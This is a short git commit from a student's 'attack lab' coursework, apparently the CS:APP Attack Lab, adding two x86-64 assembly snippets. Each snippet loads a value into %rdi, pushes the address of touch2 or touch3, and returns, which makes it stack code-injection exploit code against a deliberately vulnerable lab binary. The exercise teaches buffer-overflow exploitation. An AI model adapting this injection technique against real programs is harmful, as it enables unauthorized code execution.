c98b542c2b027ecd47a615774b1dd4909b14a929
moksha <moksha0224@berkeley.edu>
2022-07-01 22:48:37 +0800

    attack lab done

---
+++ lab3/target1/example2.s
@@ -0,0 +1,3 @@
+movq $0x59b997fa, %rdi
+pushq $0x4017ec         # the address of touch2
+ret
---
+++ lab3/target1/example3.s
@@ -0,0 +1,4 @@
+# injection code
+movq $0x5561dca8, %rdi
+pushq $0x4018fa      # the address of touch3
+ret                  # back to touch3
